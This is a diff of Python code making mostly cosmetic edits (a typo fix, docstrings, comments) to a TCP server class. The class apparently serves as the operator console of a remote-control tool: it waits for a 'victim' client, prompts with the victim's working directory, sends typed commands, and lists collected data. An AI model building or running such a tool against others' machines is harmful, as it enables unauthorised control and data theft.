@@ -26,23 +26,21 @@ class ServerTcp:
         except (socket.error, Exception) as e:
             print("Error in connection", e)
             return
-        self.connection = True
+
         self.s.listen(5)
         print("Ur server is running")
-        self.client_socket = ''
-        self.address = ''
         self.start_conn()
 
     def test_connection(self):
         while True:
             time.sleep(2)
             try:
-                self.client_socket.send("CHECKING CONNNECTION".encode())
+                self.client_socket.send("CHECKING CONNECTION".encode())
             except socket.error:
                 self.connection = False
 
     def start_conn(self):
-        """ Function that waits for client connection """
+        """Function that waits for client connection."""
 
         print("\n[ Waiting For Client ]\n")
         self.client_socket, self.address = self.s.accept()
@@ -55,7 +53,7 @@ class ServerTcp:
         self.connection_open()
 
     def connection_open(self):
-        """"""
+        """Interacting with the connection."""
         self.connection, get_victim_pwd, swap = True, True, ''
 
         while self.connection:
@@ -67,7 +65,7 @@ class ServerTcp:
             msg = input(f"{get_victim_pwd} > ").strip()
             if msg in ['exit', 'get_op', 'get_last']:
                 get_victim_pwd = False
-            if msg == 'exit':
+            if msg == 'exit':  # Close the server
                 exit(0)
             elif msg == "get_op":  # show the collection data.
                 for i in self.mycol.find():
